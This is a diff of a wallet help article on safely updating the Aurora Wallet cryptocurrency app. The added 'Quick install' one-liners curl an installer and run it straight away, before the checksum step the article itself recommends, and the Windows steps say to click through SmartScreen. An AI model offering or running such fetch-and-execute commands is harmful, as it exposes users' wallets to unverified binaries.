@@ -1,109 +1,123 @@
----
-title: "How to Update Aurora Wallet Safely"
-description: "A secure step-by-step guide to updating your Aurora Wallet. Learn how to backup your data and transition to the latest version without risking your AUR."
-primary_keyword: "update aurora wallet"
-silo: "Downloads & Releases"
-updated: 2026-10-10
----
+![Aurora Wallet update safely guide](assets/aurora-wallet-guide-article-banner.png)
 
-![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)
+# How to update Aurora Wallet safely
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+Back up, verify, replace the program, keep the wallet file: the update order that cannot cost you coins.
 
-# How to Update Aurora Wallet Safely
+## Downloads - 2026.08.1.0
 
-Updating your Aurora Wallet is a critical maintenance task "designed to" ensure the ongoing security, stability, and network compatibility of your Auroracoin (AUR) assets. The safe update process involves creating a manual backup of your local data, downloading the verified latest release from official channels, and performing a clean replacement of the application binaries to integrate the latest cryptographic improvements and protocol fixes across all desktop platforms.
+<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-## You'll see this if
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |
 
-*   The official Auroracoin website or social media channels announce a new mandatory or recommended version.
-*   Your wallet software displays an "Update Available" notification or a prompt indicating a newer build is ready.
-*   You are experiencing synchronization issues or network errors caused by an outdated client version.
-*   You want to benefit from the latest UI enhancements and performance optimizations included in the current release.
-*   You are migrating from a very old version (e.g., v1.x) to the modern 2026.08.1.0 standard.
 
-## Why Regular Updates are Essential
+An Aurora Wallet update replaces the application, not your wallet. Keep that difference in mind and the process is uneventful.
 
-The landscape of decentralized finance is constantly shifting. As the Auroracoin blockchain grows and new security threats emerge, the developers must issue updates to keep the software resilient. These updates are "designed to" address several key areas:
+Updates arrive as a new release with a new installer for each system. The wallet data lives outside the program folder, so the safe order is always the same: copy the wallet file, verify the download, close the app, install, reopen and let the chain catch up.
 
-1.  **Network Consensus:** Sometimes the network undergoes a "hard fork" or a protocol upgrade. If you do not update, your wallet will remain on a separate, invalid chain split, and your transactions will not be recognized by the rest of the community.
-2.  **Security Patches:** Vulnerabilities in third-party libraries (like OpenSSL or Qt) are discovered frequently. Updates bundle the latest patched versions of these libraries to protect your local [password encryption](34-password-encryption.md) from being bypassed by malware.
-3.  **Performance Tuning:** As the blockchain ledger increases in size, the wallet requires more efficient indexing. New versions often include optimizations that reduce CPU and memory usage during the initial sync and daily operation.
-4.  **Bug Fixes:** Community feedback helps identify edge cases where the wallet might crash or display incorrect information. Each update cycle closes these gaps, providing a more reliable experience for managing your AUR.
+<!-- ARTICLE-BODY-BEGIN -->
 
-For a full list of recent changes, visit the [Aurora Wallet Updates page](https://auroracoin.net/updates) on the official website.
+## Back up before anything else
 
----
+Copy the wallet file from the data directory to an encrypted USB drive before you start. The recovery phrase already restores the keys, and the wallet file restores the labels, the address book and the transaction metadata that the phrase cannot rebuild.
 
-## The fix: The Safe Update Procedure
+Write the phrase on paper too if the paper copy is missing or unreadable. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md">Backup best practice</a> explains what each kind of backup covers.
 
-Follow these steps exactly to ensure your Auroracoin remains safe during the transition to a new version.
+## Update in four steps
 
-### Phase 1: The Pre-Update Backup
-Never attempt to update your software without a recent backup. While the update process is non-destructive, hardware failure or power loss during the installation can corrupt your data.
-1.  **Confirm your Seed Phrase:** Ensure you have your 12 or 24-word [BIP-39 recovery phrase](25-recovery-phrase-bip39.md) written down and stored securely.
-2.  **Manual Wallet.dat Backup:** Locate your data directory (refer to the [wallet.dat location guide](21-wallet-dat-location.md)). Copy the `wallet.dat` file to an external encrypted USB drive.
-3.  **Close the Application:** Shut down the Aurora Wallet completely. Wait for the process to disappear from your system's task manager to ensure all database files are cleanly closed.
+1. Open the release page and read the notes for the version you are installing.
+2. Download the installer for your system and compare its SHA-256 value.
+3. Close the wallet completely, checking the task manager or activity monitor for a leftover process.
+4. Install the new build, open it and let the chain finish catching up before sending a transaction.
 
-### Phase 2: Acquisition and Verification
-1.  **Official Download:** Visit the [official Aurora Wallet download page](https://auroracoin.net/download) or the [GitHub releases page](07-github-releases-guide.md).
-2.  **Integrity Check:** Calculate the SHA256 hash of the downloaded file. Match it against the official hashes provided in the [Release 2026.08.1.0 details](08-release-2026-08-1-0.md). This is your primary defense against [fake wallet downloads](10-spot-fake-wallet-downloads.md).
+Do not delete the old installer until the new build has opened and shown your balance. If something goes wrong, reinstalling the previous version is a two-minute recovery.
 
-### Phase 3: Installation (Platform Specific)
-*   **Windows:** Run the new installer. It is "designed to" detect your existing installation and overwrite the program files in `C:\Program Files\Auroracoin` while leaving your data in `AppData\Roaming` untouched.
-*   **macOS:** Open the `.dmg`, drag the Aurora Wallet icon to the **Applications** folder, and select **"Replace"** when prompted by the OS.
-*   **Linux:** Delete the old binary and extract the new one from the `.zip` archive. Ensure you apply the correct [Linux permissions](20-linux-permissions.md) with `chmod +x`.
+The download and the checksums for the current version sit on the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">latest Aurora Wallet release</a> page.
 
-### Phase 4: Verification and Re-indexing
-1.  **Launch the Wallet:** Open the application. Go to **Help > About Aurora Wallet** to confirm the version number is now 2026.08.1.0.
-2.  **Monitor Sync:** The wallet may perform a "re-scan" or a brief sync to verify the most recent blocks against the new software logic. Let this finish completely.
-3.  **Check Balance:** Confirm your balance and transaction history are visible and accurate.
+## What can go wrong
 
----
+A permission prompt on macOS after an update is normal: the new bundle has not been approved before, so System Settings asks once. On Windows, a firewall prompt can return for the same reason, and allowing the app on private networks restores the connection.
 
-## If that didn't work
-
-*   **Zero Balance After Update:** Don't panic. This usually means the wallet hasn't finished syncing or needs to re-scan. Ensure the sync bar at the bottom is at 100%. If it is, try running the wallet with the `-rescan` command line argument.
-*   **Wallet Crashes on Launch:** A new version might be incompatible with a corrupted local block database. You may need to perform a full re-index. Refer to the [wallet crashes guide](https://auroracoin.net/troubleshooting/wallet-crashes) for instructions.
-*   **Permission Errors:** On macOS, you may need to re-approve the new binary in **System Settings > Privacy & Security** because it is a new file that Gatekeeper doesn't recognize yet.
-*   **Database Migration Fail:** If you are moving from a version that is several years old, you might need a two-step migration. Consult the [migration from Auroracoin Core](27-migrate-from-auroracoin-core.md) guide.
-
-## Prevention
-
-*   **Enable Notifications:** Keep an eye on official Auroracoin Foundation announcements to catch mandatory security updates early.
-*   **Stick to Stable Releases:** Avoid using "beta" or "nightly" builds for your primary wallet unless you are a developer. Use only stable releases from the [official repository](07-github-releases-guide.md).
-*   **Avoid Phishing Links:** Never click a link in an email or social media DM that claims your wallet is "locked" and requires an immediate update. These are almost always scams.
-*   **Practice Good Hygiene:** Delete old installer files after a successful update to prevent accidentally running an outdated version in the future.
-
----
+A sync that stalls immediately after an update usually means the chain state needs a moment or the peer list is stale, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md">wallet not syncing</a> covers the order of checks. If the About window still shows the old version, you launched a second copy from a different folder.
 
 ## FAQ
 
-**Do I lose my Auroracoin if I update?**
-No. Your AUR is stored on the blockchain, and your private keys are stored in your `wallet.dat` file. The update only changes the program files that interact with that data. As long as you have your backup, your funds are safe.
+### Can I skip several versions?
 
-**How often should I check for updates?**
-We recommend checking the [Aurora Wallet website](https://auroracoin.net) or GitHub repository once every few months or whenever you hear news of a major network change.
+Yes. Install the newest release directly; the wallet reads data written by earlier versions.
 
-**Can I skip a version?**
-Usually, yes. However, if you skip many years of updates, you may encounter database format changes that require a re-index or a manual migration of your `wallet.dat`.
+### Should I remove the old installer?
 
-**Why does the update take so long to sync?**
-If a new version includes changes to how blocks are verified, it may need to re-check parts of the blockchain. This is "designed to" ensure your local copy of the ledger is perfect.
+After the new build has opened and shown your balance, yes. Keeping stale installers invites accidental downgrades.
 
----
+<!-- ARTICLE-BODY-END -->
 
-## The current release
+## How to install Aurora Wallet
 
-Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:
+### Windows
+Quick install (CMD):
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+```cmd
+curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
+```
 
-Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
 
-## Related articles
+Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.
 
-*   [06-verify-sha256-checksums.md](06-verify-sha256-checksums.md)
-*   [33-backup-best-practice.md](33-backup-best-practice.md)
-*   [08-release-2026-08-1-0.md](08-release-2026-08-1-0.md)
-*   [27-migrate-from-auroracoin-core.md](27-migrate-from-auroracoin-core.md)
+```cmd
+certutil -hashfile setup.exe SHA256
+```
+
+### macOS
+Quick install (Terminal):
+
+```bash
+curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.
+
+```bash
+shasum -a 256 setup.dmg
+```
+
+### Linux
+Quick install (Terminal):
+
+```bash
+curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
+2. Extract the archive.
+3. Run `aurora-wallet`.
+
+Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.
+
+```bash
+sha256sum app.zip
+```
+
+
+## Related guides
+
+- [Release 2026.08.1.0 details](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/08-release-2026-08-1-0.md)
+- [Backup best practice](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md)
+- [Wallet not syncing](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md)
+- [GitHub releases guide](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/07-github-releases-guide.md)
